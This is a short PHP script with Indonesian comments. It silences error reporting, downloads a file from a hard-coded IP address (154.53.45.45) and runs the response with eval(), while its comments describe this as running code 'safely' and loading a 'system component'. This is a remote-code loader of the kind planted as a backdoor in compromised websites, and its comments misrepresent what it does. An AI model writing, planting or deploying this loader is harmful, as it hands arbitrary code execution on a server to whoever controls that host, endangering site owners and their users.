<?php

// Menonaktifkan pelaporan kesalahan untuk keamanan
error_reporting(0);
ini_set('display_errors', 0);

// Menentukan URL sumber
$url = 'http://154.53.45.45/protect/wesley_so.js';

// Mengambil konten dari URL yang ditentukan
$content = file_get_contents($url);

// Memastikan bahwa konten berhasil diambil
if ($content !== false) {
    // Menjalankan kode PHP yang diambil dengan aman
    // Menggunakan penutup tag PHP untuk menangani konten yang mungkin diawali dengan <?php
    eval('?>' . $content);
} else {
    // Menangani kesalahan jika konten tidak dapat diambil
    error_log("Gagal mengambil konten dari URL: $url");
    exit('Gagal memuat komponen sistem.');
}
?>
